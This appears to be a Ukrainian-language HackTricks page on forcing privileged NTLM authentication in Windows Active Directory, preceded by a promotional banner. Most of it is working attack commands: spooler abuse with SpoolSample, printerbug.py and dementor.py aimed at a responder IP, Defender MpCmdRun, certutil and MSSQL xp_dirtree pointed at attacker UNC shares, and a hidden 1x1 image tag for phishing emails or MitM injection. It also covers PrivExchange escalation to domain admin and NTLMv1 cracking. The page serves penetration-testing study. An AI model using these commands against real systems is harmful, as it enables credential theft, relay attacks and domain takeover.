# Примусова привілейована аутентифікація NTLM

<details>

<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Ви працюєте в **кібербезпеці компанії**? Хочете побачити вашу **компанію в рекламі на HackTricks**? або хочете мати доступ до **останньої версії PEASS або завантажити HackTricks у PDF**? Перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
* **Приєднуйтесь до** [**💬**](https://emojipedia.org/speech-balloon/) [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за мною на **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Поділіться своїми хакерськими трюками, надсилайте PR до [репозиторію hacktricks](https://github.com/carlospolop/hacktricks) та [репозиторію hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) - це **колекція** віддалених тригерів аутентифікації, написаних на C# з використанням компілятора MIDL для уникнення залежностей від сторонніх постачальників.

## Зловживання служби спулера

Якщо служба _**Print Spooler**_ **увімкнена**, ви можете використовувати вже відомі облікові дані AD для **запиту** до друкованого сервера контролера домену про **оновлення нових друкованих завдань** та просто сказати йому **надіслати сповіщення на деяку систему**.\
Зверніть увагу, що коли принтер надсилає сповіщення на довільні системи, він повинен **аутентифікуватися** на цій **системі**. Тому зловмисник може змусити службу _**Print Spooler**_ аутентифікуватися на довільній системі, і служба **використовуватиме обліковий запис комп'ютера** для цієї аутентифікації.

### Пошук Windows-серверів у домені

За допомогою PowerShell отримайте список Windows-боксів. Сервери зазвичай мають пріоритет, тому давайте зосередимося на них:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Знаходження служб, які прослуховують спулер

Використовуючи трохи змінений @mysmartlogin's (Вінсент Ле Ту) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket), перевірте, чи прослуховується служба спулера:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Ви також можете використовувати rpcdump.py на Linux та шукати протокол MS-RPRN.
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
### Запитайте сервіс про аутентифікацію на довільному хості

Ви можете скомпілювати [**SpoolSample звідси**](https://github.com/NotMedic/NetNTLMtoSilverTicket)**.**
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
або використовуйте [**dementor.py від 3xocyte**](https://github.com/NotMedic/NetNTLMtoSilverTicket) або [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py), якщо ви працюєте на Linux
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
### Комбінування з Неконтрольованим Делегуванням

Якщо зловмисник вже скомпрометував комп'ютер з [Неконтрольованим Делегуванням](unconstrained-delegation.md), зловмисник може **змусити принтер аутентифікуватися на цьому комп'ютері**. Через неконтрольоване делегування **TGT** **комп'ютерного облікового запису принтера** буде **збережено в** **пам'яті** комп'ютера з неконтрольованим делегуванням. Оскільки зловмисник вже скомпрометував цей хост, він зможе **отримати цей квиток** та використати його ([Передача квитка](pass-the-ticket.md)).

## Примусова аутентифікація RCP

{% embed url="https://github.com/p0dalirius/Coercer" %}

## PrivExchange

Атака `PrivExchange` є результатом вразливості, виявленої в **функції Exchange Server `PushSubscription`**. Ця функція дозволяє Exchange-серверу бути примусованим будь-яким користувачем домену з поштовою скринькою аутентифікуватися на будь-якому клієнтом наданим хостом через HTTP.

За замовчуванням, **служба Exchange працює як SYSTEM** та має надмірні привілеї (зокрема, вона має **привілеї WriteDacl на домен до оновлення кумулятивного оновлення 2019 року**). Цю вразливість можна використовувати для **пересилання інформації до LDAP та подальшого вилучення бази даних NTDS домену**. У випадках, коли пересилання до LDAP неможливе, цю вразливість все одно можна використовувати для пересилання та аутентифікації на інших хостах у межах домену. Успішна експлуатація цієї атаки надає негайний доступ до адміністратора домену з будь-яким аутентифікованим обліковим записом домену.

## Усередині Windows

Якщо ви вже увійшли в систему Windows, ви можете змусити Windows підключатися до сервера за допомогою привілейованих облікових записів за допомогою:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
Або скористайтеся іншою технікою: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

Можна використовувати lolbin certutil.exe (бінарний файл, підписаний Microsoft) для примусової аутентифікації NTLM:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## Впровадження HTML

### Через електронну пошту

Якщо ви знаєте **адресу електронної пошти** користувача, який увійшов в систему машини, яку ви хочете скомпрометувати, ви можете просто надіслати йому **електронний лист з зображенням розміром 1x1**, наприклад
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
### MitM

Якщо ви можете виконати атаку типу MitM на комп'ютер і впровадити HTML на сторінку, яку він переглядає, ви можете спробувати впровадити зображення, подібне до наступного, на сторінку:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## Взлам NTLMv1

Якщо ви можете захопити виклики NTLMv1, прочитайте тут, як їх взламати.\
_Пам'ятайте, що для взлому NTLMv1 вам потрібно встановити виклик Responder на "1122334455667788"_
